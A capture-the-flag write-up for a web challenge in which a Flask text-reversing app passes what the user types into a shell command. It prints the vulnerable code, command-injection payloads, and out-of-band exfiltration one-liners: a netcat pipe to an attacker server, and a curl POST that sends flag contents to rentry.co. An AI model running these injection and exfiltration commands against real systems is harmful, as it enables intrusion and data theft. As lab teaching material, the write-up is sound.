# Fall Challenge 7: textReverse

**Category**: web    
**Points**: 150 (2 flags)     
**Description**:  
**Flag 1**   
...hguoht tupni resu ezitinas ot togrof evah yam I !sdeen gnisrever txet ruoy lla rof tcefrep si noitacilppa lufesu dna ydnah repus sihT
**Flag 2**   
!tuptuo on htiw ppa ym fo noisrev ateb eht gnikaerb yrT ?trams os era uoy kniht uoY

---

# Approach

This challenge includes two websites that take user inputted text strings and reverse them. The first website shows the resulting output, while the second does not.

Both websites are vulnerable to bash command injection, however the second website requires some creativity to exfiltrate the flag.

# Flag 1

There's a great many things that the server could be doing with the user input, but my first guess was that it was simply running a bash command. To test this theory I entered the following text into the website:

`; ls #`

The semicolon is used to separate different commands on one line and the hashtag begins a comment. Here's an example of what I am hoping the server is doing back there:

`some-command $INPUT | maybe-another-command`

With our input:

`some-command ; ls # | maybe-another-command`

This works because the semicolon ends whatever command comes before our input and comments out anything that might come after. If all goes well the server will execute `ls` as a new command and the contents of the server's directory will be displayed.

Convienently this is exactly what happens. The directory includes an `app1.py` file and a `flags` directory. Before we get to the flag, let's investigate the `app1.py` file to see what's happening with our input. It turns out that the server is running a simple Flask (a Python web framework) server that runs the following:

```python
...
command = f"echo {text} | rev"
output = os.popen(command).read()
...
```

Quite close to what we theorized. Now let's replace `ls` with `grep -r osu` to recursively search files for the start of a flag. Sending `; grep -r osu #` to the server gives us our first flag.

# Flag 2

The website for flag 2 does not display any output. To find the flag we're going to have to exfiltrate the output of our commands ourselves. There are many ways we could do this, we could: upload to Google Drive or Github, send an email, set a FaceBook status, hide the data in an image and upload it to Imgur, or just connect directly to a server we own.

## Netcat Exfiltration

Since the server has no protection against establishing a TCP connection with an evil server and sending it data, let's do that. Segfault provides free throwaway root servers that serve this purpose perfectly. I set up a simple netcat listener on our new evil server and sent the website the following text:

`; ls | nc -q 0 [IP & port of evil server] #`

> [!TIP]
> The `-q 0` flag causes netcat to `q`uit after `0` seconds to avoid the connection hanging.

This sends the output of `ls` to our evil server, which reveals a suspicously named `flag2.txt` file. Reading the file using the same technique (replace `ls` with `cat flag2.txt | rev`) gives us our second flag.

## (Bonus) Rentry.co Exfiltration

What if instead of using our own evil server we wanted to use someone else's server for evil? Here's a simple example of using the pastebin-like service `rentry.co` for exfiltration: 

```
; curl -X POST https://rentry.co/api/new -d "text=$(cat flag2.txt | rev)" -d "url=evil84074" #
```

A new public file at https://rentry.co/evil84074 is born containing the flag.

# Retrospect

This one was fairly straightforward. There are plenty of fun ways to exfiltrate data and I got a good time trying to think of the least efficient methods. I discovered a communitity of people who trade rentry.co urls, that was interesting. I wonder if there's any nefarious actors hacking rival rentryzens for their urls like the people who sell twitter usernames. Makes you think, huh. Here's a picture of a tree I drew for you:
```rust
  / \
 /  *\
/ *   \
  | |
  | |
```
